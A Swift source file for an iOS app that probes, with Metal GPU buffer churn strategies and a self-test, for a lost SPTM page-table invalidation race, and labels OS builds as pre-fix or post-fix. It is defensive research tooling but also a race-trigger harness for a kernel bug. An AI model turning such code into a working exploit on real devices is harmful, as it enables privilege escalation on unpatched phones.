//
//  Detector.swift  v4
//
//  Attempts to observe a lost SPTM stage-2 (UAT) TLBI from an unprivileged app.
//
//  DESIGN
//    positive control : deliberate foreign write, proves the checker can fire
//    control phase    : no churn, proves the checker does not fire spuriously
//    grow phase       : hold a large arena so the pool sits past any pre-mapped
//                       region and new buffers must create real mappings
//    churn phase      : one of three strategies, selectable
//
//  STRATEGIES
//    fragment : free an alternating subset of a contiguous VA window. Partial,
//               unaligned unmaps are the shape the writeup names
//               (DART_UNGANG_GAPF_RACE) -- a whole-run unmap gets ganged and
//               never races.
//    purge    : purge -> thief -> unpurge. Tears down and rebuilds a mapping on
//               a stable VA, so a stale entry is directly observable with no
//               reliance on the allocator recycling anything.
//    recycle  : random slot recycle (v3 behaviour), kept for comparison.
//
//  CANNOT establish: whether any of this reaches the SPTM UAT mutation path.
//

import Foundation
import Metal

enum BuildGate {
    enum Verdict {
        case vulnerable(String), fixed(String), unknown(String)
        var text: String {
            switch self {
            case .vulnerable(let b): return "build \(b) — SPTM pre-fix, bug present"
            case .fixed(let b):      return "build \(b) — SPTM post-fix, bug closed"
            case .unknown(let b):    return "build \(b) — outside the writeup's corpus"
            }
        }
    }
    static var osBuild: String {
        var len = 0
        guard sysctlbyname("kern.osversion", nil, &len, nil, 0) == 0, len > 0 else { return "?" }
        var buf = [CChar](repeating: 0, count: len + 1)
        guard sysctlbyname("kern.osversion", &buf, &len, nil, 0) == 0 else { return "?" }
        return String(cString: buf)
    }
    static var verdict: Verdict {
        let b = osBuild
        switch b {
        case "24A446", "24B5084k": return .vulnerable(b)
        case "24B5099f":           return .fixed(b)
        default: break
        }
        if b.hasPrefix("24A") { return .vulnerable(b) }
        if b.hasPrefix("24B5") {
            let d = b.dropFirst(3).prefix(while: { $0.isNumber })
            if let n = Int(d) { return n >= 5099 ? .fixed(b) : .vulnerable(b) }
        }
        return .unknown(b)
    }
}

enum Strategy: String, CaseIterable, Identifiable {
    case fragment, purge, recycle
    var id: String { rawValue }
    var note: String {
        switch self {
        case .fragment: return "alternating frees in a contiguous window — targets un-ganging"
        case .purge:    return "purge/thief/unpurge on a stable VA — no reuse lottery"
        case .recycle:  return "random slot recycle — baseline"
        }
    }
}

final class Detector: ObservableObject {

    // ---- tuning ----
    private let slots        = 256
    private let bytes        = 16 * 1024
    private let window       = 64                 // contiguous window for fragment
    private let arenaBytes   = 256 * 1024 * 1024  // held, to get past any heap
    private let controlRounds = 300
    private let publishEvery  = 0.1

    private let sentinel: UInt32 = 0xDEAD_BEEF
    private let poolTag:  UInt32 = 0xA5A5_0000
    private let burstTag: UInt32 = 0xB6B6_0000

    enum Kind: String { case vacated = "write did not land"
                        case stale = "stale pattern"
                        case unexplained = "unexplained" }

    struct Counts { var vacated = 0; var stale = 0; var unexplained = 0
                    var total: Int { vacated + stale + unexplained } }

    struct Probe {
        var allocations = 0
        var vaReuses    = 0
        var vaLo: UInt64 = 0
        var vaHi: UInt64 = 0
        var arenaMiB    = 0
        var gpuBytes: UInt64 = 0
        var rangeMiB: Double { vaLo == 0 ? 0 : Double(vaHi &- vaLo) / 1_048_576 }
    }

    @Published private(set) var counts  = Counts()
    @Published private(set) var probe   = Probe()
    @Published private(set) var recent: [String] = []
    @Published private(set) var phase   = "idle"
    @Published private(set) var running = false
    @Published private(set) var ready   = false
    @Published private(set) var verdict = BuildGate.verdict
    @Published private(set) var selfTest: [String] = []
    @Published private(set) var vaProbeAvailable = false
    @Published var strategy: Strategy = .fragment

    private var dev: MTLDevice?
    private var queue: MTLCommandQueue?
    private var pipe: MTLComputePipelineState?
    private var pool = [MTLBuffer?]()
    private var arena: [MTLBuffer] = []
    private var freedVAs = Set<UInt64>()
    private var stopFlag = false
    private var roundCounter = 0
    private var lastPublish = CFAbsoluteTimeGetCurrent()
    private var wCounts = Counts()
    private var wProbe  = Probe()

    private let work = DispatchQueue(label: "sptm.racepoc", qos: .userInitiated)

    private static let shader = """
    #include <metal_stdlib>
    using namespace metal;
    kernel void stamp(device uint *p [[buffer(0)]],
                      constant uint &v [[buffer(1)]],
                      uint i [[thread_position_in_grid]]) { p[i] = v; }
    """

    init() {
        if #available(iOS 18.0, *) { vaProbeAvailable = true }
        guard let d = MTLCreateSystemDefaultDevice(),
              let cq = d.makeCommandQueue(),
              let lib = try? d.makeLibrary(source: Self.shader, options: nil),
              let fn = lib.makeFunction(name: "stamp"),
              let p = try? d.makeComputePipelineState(function: fn)
        else { return }
        dev = d; queue = cq; pipe = p
        pool = [MTLBuffer?](repeating: nil, count: slots)
        ready = true
    }

    func start() {
        guard ready, !running else { return }
        running = true; stopFlag = false
        work.async { [weak self] in self?.loop() }
    }
    func stop() { stopFlag = true }

    var headline: String {
        if !vaProbeAvailable { return "VA reuse unmeasurable on this OS — premise cannot be probed" }
        if counts.total > 0 { return "\(counts.total) anomalies — a foreign GPU write was observed" }
        if probe.vaReuses == 0 {
            return "0 anomalies, 0 VA reuses — uninformative, the detector could not fire"
        }
        return "0 anomalies across \(probe.vaReuses) VA reuses — no hit; premise still unestablished"
    }

    @inline(__always)
    private func va(_ b: MTLBuffer?) -> UInt64? {
        guard let b else { return nil }
        if #available(iOS 18.0, *) { return b.gpuAddress }
        return nil
    }

    // MARK: loop

    private func loop() {
        guard let dev, let queue, let pipe else { return }

        runSelfTest(dev: dev, queue: queue, pipe: pipe)

        // Grow: hold a large arena so the pool lands past any pre-mapped region.
        publish(phase: "grow (\(arenaBytes >> 20) MiB held)")
        let chunk = 4 * 1024 * 1024
        while arena.count * chunk < arenaBytes {
            if let b = dev.makeBuffer(length: chunk, options: .storageModePrivate) {
                arena.append(b)
            } else { break }
            if stopFlag { break }
            let mib = (arena.count * chunk) >> 20
            DispatchQueue.main.async { [weak self] in self?.probe.arenaMiB = mib }
        }

        for i in 0..<slots {
            pool[i] = dev.makeBuffer(length: bytes, options: .storageModeShared)
            if let b = pool[i] { fill(b, with: sentinel) }
            note(va(pool[i]))
        }

        publish(phase: "control (no churn)")
        for _ in 0..<controlRounds {
            if stopFlag { break }
            _ = cycle(churn: false, dev: dev, queue: queue, pipe: pipe)
        }

        publish(phase: "churn — \(strategy.rawValue)")
        while !stopFlag {
            _ = cycle(churn: true, dev: dev, queue: queue, pipe: pipe)
        }
        publish(phase: "idle", done: true)
    }

    // MARK: positive control

    private func runSelfTest(dev: MTLDevice, queue: MTLCommandQueue, pipe: MTLComputePipelineState) {
        var out: [String] = []
        defer { let s = out; DispatchQueue.main.async { self.selfTest = s } }

        guard let a = dev.makeBuffer(length: bytes, options: .storageModeShared),
              let b = dev.makeBuffer(length: bytes, options: .storageModeShared) else {
            out.append("FAIL — allocation"); return
        }
        let tagA = poolTag | (0x10 << 8) | 0x01
        let tagB = poolTag | (0x11 << 8) | 0x02

        fill(a, with: sentinel); fill(b, with: sentinel)
        stamp([(a, tagA), (b, tagB)], dev: dev, queue: queue, pipe: pipe)
        out.append(classify(a, want: tagA) == nil ? "PASS  clean stamp (a)" : "FAIL  clean stamp (a)")
        out.append(classify(b, want: tagB) == nil ? "PASS  clean stamp (b)" : "FAIL  clean stamp (b)")

        stamp([(a, tagB)], dev: dev, queue: queue, pipe: pipe)
        if classify(a, want: tagA) == .stale, let g = firstWord(a), (g >> 8) & 0xFF == 0x11 {
            out.append("PASS  foreign write detected, source slot decoded")
        } else { out.append("FAIL  foreign write") }

        stamp([(a, tagA), (b, tagB)], dev: dev, queue: queue, pipe: pipe)
        fill(b, with: sentinel)
        out.append(classify(b, want: tagB) == .vacated ? "PASS  vacated write detected"
                                                       : "FAIL  vacated write")
    }

    // MARK: round

    @discardableResult
    private func cycle(churn: Bool, dev: MTLDevice, queue: MTLCommandQueue,
                       pipe: MTLComputePipelineState) -> Int {
        roundCounter &+= 1
        let round = roundCounter

        var fresh: [Int] = []
        if churn {
            switch strategy {
            case .fragment: fresh = fragmentChurn(dev)
            case .purge:    fresh = purgeChurn(dev, queue: queue, pipe: pipe)
            case .recycle:  fresh = recycleSlots(dev)
            }
            for i in fresh { if let b = pool[i] { fill(b, with: sentinel) } }
        }

        let order = fresh + (0..<slots).filter { !fresh.contains($0) }
        var items: [(MTLBuffer, UInt32)] = []
        for i in order {
            if let b = pool[i] { items.append((b, expected(slot: i, round: round))) }
        }
        stamp(items, dev: dev, queue: queue, pipe: pipe)

        var bad = 0
        for i in order {
            guard let b = pool[i] else { continue }
            guard let kind = classify(b, want: expected(slot: i, round: round)) else { continue }
            bad += 1
            record(kind, slot: i, round: round, got: firstWord(b) ?? 0)
        }
        maybePublish()
        return bad
    }

    // MARK: churn strategies

    /// Alternating frees inside a contiguous window. A whole-window unmap gets
    /// ganged into one TLBI; freeing every other slot forces partial,
    /// unaligned unmaps -- the un-ganged shape.
    private func fragmentChurn(_ dev: MTLDevice) -> [Int] {
        let base = Int.random(in: 0...(slots - window))
        var fresh: [Int] = []
        for k in stride(from: 0, to: window, by: 2) {
            fresh.append(replace(base + k, dev))
        }
        return fresh
    }

    /// Purge a slot's backing, let a thief take the pages, then unpurge. The VA
    /// never moves, so any staleness is directly observable.
    private func purgeChurn(_ dev: MTLDevice, queue: MTLCommandQueue,
                            pipe: MTLComputePipelineState) -> [Int] {
        let i = Int.random(in: 0..<slots)
        guard let victim = pool[i] else { return [] }

        _ = victim.setPurgeableState(.empty)

        if let thief = dev.makeBuffer(length: bytes, options: .storageModeShared) {
            stamp([(thief, burstTag | 0x77)], dev: dev, queue: queue, pipe: pipe)
        }

        _ = victim.setPurgeableState(.nonVolatile)
        return [i]
    }

    private func recycleSlots(_ dev: MTLDevice) -> [Int] {
        (0..<8).map { _ in replace(Int.random(in: 0..<slots), dev) }
    }

    private func replace(_ i: Int, _ dev: MTLDevice) -> Int {
        if let old = va(pool[i]) {
            if freedVAs.count > 8192 { freedVAs.removeAll() }
            freedVAs.insert(old)
        }
        pool[i] = nil
        pool[i] = dev.makeBuffer(length: bytes, options: .storageModeShared)
        if let v = va(pool[i]), freedVAs.contains(v) { wProbe.vaReuses += 1 }
        note(va(pool[i]))
        return i
    }

    // MARK: primitives

    private func stamp(_ items: [(MTLBuffer, UInt32)], dev: MTLDevice,
                       queue: MTLCommandQueue, pipe: MTLComputePipelineState) {
        guard !items.isEmpty, let cb = queue.makeCommandBuffer(),
              let enc = cb.makeComputeCommandEncoder() else { return }
        enc.setComputePipelineState(pipe)
        for (b, value) in items {
            var v = value
            enc.setBuffer(b, offset: 0, index: 0)
            enc.setBytes(&v, length: 4, index: 1)
            enc.dispatchThreads(MTLSize(width: bytes / 4, height: 1, depth: 1),
                                threadsPerThreadgroup: MTLSize(width: 128, height: 1, depth: 1))
        }
        enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
    }

    private func classify(_ b: MTLBuffer, want: UInt32) -> Kind? {
        let n = b.length / MemoryLayout<UInt32>.size
        let p = b.contents().bindMemory(to: UInt32.self, capacity: n)
        guard p[0] != want || p[n / 2] != want || p[n - 1] != want else { return nil }
        let got = p[0]
        if got == sentinel { return .vacated }
        if (got & 0xFFFF_0000) == poolTag || (got & 0xFFFF_0000) == burstTag { return .stale }
        return .unexplained
    }

    private func firstWord(_ b: MTLBuffer) -> UInt32? {
        b.contents().bindMemory(to: UInt32.self, capacity: 1).pointee
    }

    @inline(__always)
    private func expected(slot: Int, round: Int) -> UInt32 {
        poolTag | (UInt32(slot) << 8) | UInt32(round & 0xFF)
    }

    private func fill(_ b: MTLBuffer, with v: UInt32) {
        let n = b.length / MemoryLayout<UInt32>.size
        b.contents().bindMemory(to: UInt32.self, capacity: n).update(repeating: v, count: n)
    }

    private func note(_ v: UInt64?) {
        wProbe.allocations += 1
        guard let v, v != 0 else { return }
        wProbe.vaLo = wProbe.vaLo == 0 ? v : min(wProbe.vaLo, v)
        wProbe.vaHi = max(wProbe.vaHi, v)
    }

    private func record(_ kind: Kind, slot: Int, round: Int, got: UInt32) {
        switch kind {
        case .vacated: wCounts.vacated += 1
        case .stale:   wCounts.stale += 1
        case .unexplained: wCounts.unexplained += 1
        }
        let line = kind == .stale
            ? "r\(round) slot \(slot): holds slot \((got >> 8) & 0xFF) — foreign write"
            : "r\(round) slot \(slot): \(kind.rawValue) (\(String(got, radix: 16)))"
        DispatchQueue.main.async { [weak self] in
            guard let self else { return }
            self.recent.insert(line, at: 0)
            if self.recent.count > 40 { self.recent.removeLast() }
        }
    }

    private func maybePublish() {
        let now = CFAbsoluteTimeGetCurrent()
        guard now - lastPublish > publishEvery else { return }
        lastPublish = now
        if let d = dev { wProbe.gpuBytes = UInt64(d.currentAllocatedSize) }
        let c = wCounts, p = wProbe
        DispatchQueue.main.async { [weak self] in self?.counts = c; self?.probe = p }
    }

    private func publish(phase p: String, done: Bool = false) {
        let c = wCounts, pr = wProbe
        DispatchQueue.main.async { [weak self] in
            guard let self else { return }
            self.phase = p; self.counts = c; self.probe = pr
            if done { self.running = false }
        }
    }
}
